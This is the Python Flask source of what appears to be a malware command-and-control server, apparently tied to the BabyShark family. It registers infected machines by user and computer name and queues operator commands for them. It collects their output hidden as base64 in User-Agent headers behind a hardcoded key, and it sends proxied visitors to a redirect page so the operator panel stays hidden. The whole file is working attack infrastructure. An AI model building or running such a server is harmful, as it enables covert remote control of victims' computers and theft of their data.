import base64, os
import logging
from flask import Flask, render_template, request, url_for, redirect
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import desc, func

app = Flask(__name__)

logging.basicConfig(filename='sharklog.log',level=logging.INFO)


if os.path.exists('database/c2.db'):
    pass
else:
    os.mknod("database/c2.db")
    
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database/c2.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['TEMPLATES_AUTO_RELOAD'] = True

db = SQLAlchemy(app)
password = 'b4bysh4rk'


def main():    
    size_db = os.path.getsize("database/c2.db")
    logging.debug('Size file database: {}'.format(size_db))
    if size_db <= 10:
        instruct()


class Command(db.Model):

    id = db.Column(db.Integer, primary_key=True)
    cmd = db.Column(db.String)
    done = db.Column(db.Boolean)
    logging.debug('Table: command, columns: {}, {}, {}'.format(id, cmd, done))


class Results(db.Model):
    
    id = db.Column(db.Integer, primary_key=True)
    results = db.Column(db.String)
    logging.debug('Table: results, columns: {}, {}'.format(id, results))

class Agents(db.Model):
    
    guid = db.Column(db.String, primary_key=True)
    user = db.Column(db.String)
    computer = db.Column(db.String)
    logging.debug('Table: results, columns: {}, {}'.format(id, results))


@app.route('/')
def home():
    if len(Results.query.all()) == 0:
        return render_template('index.html', returns=' \n ')
    else:
        get_returns = Results.query.order_by(desc(Results.id))
        logging.debug('Get Returns Table: {}'.format(get_returns))
        get_commands = Command.query.all()
        if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
            return render_template('index.html',
                                   returns=get_returns[0].results,
                                   commands=get_commands)
        else:
            return render_template('redir.html')

@app.route('/register')
def register():
    guid = request.args.get('guid')
    user = request.args.get('user')
    computer = request.args.get('computer')
    save_agent = Agents(guid = guid, user=user, computer=computer)
    db.session.add(save_agent)
    db.session.commit() 
    return render_template('register.html')


@app.route('/commands')
def getcommand():
    secretkey = request.args.get('key')
    guid = request.args.get('guid')
    if secretkey == password:
        result = request.headers.get('User-Agent').split('|')
        if len(result) >= 2:
            result_command = base64.b64decode(result[1]).decode('utf-8')
            id_command = result[2].split(',')[0]

            save_results = Results(results=result_command)
            db.session.add(save_results)
            command_done = \
                Command.query.filter_by(id=int(id_command)).first()
            command_done.done = not command_done.done
            db.session.commit()
        task_queue = Command.query.all()
        return render_template('commands.html', task_queue=task_queue)
    else:
        return render_template('redir.html')


@app.route('/create-task', methods=['POST'])
def create():
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        new_task = Command(cmd=request.form['content'], done=False)
        db.session.add(new_task)
        db.session.commit()
        return redirect(url_for('home'))
    else:
        return render_template('redir.html')


@app.route('/done/<id>')
def done(id):#marks the command "done" in the sql database
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        task = Command.query.filter_by(id=int(id)).first()
        task.done = not task.done 
        db.session.commit()
        return redirect(url_for('home'))
    else:
        return render_template('redir.html')


@app.route('/delete/<id>')
def delete(id):
    Command.query.filter_by(id=int(id)).delete()
    db.session.commit()
    return redirect(url_for('home'))

if __name__ == '__main__':
    main()
    app.run(debug=False)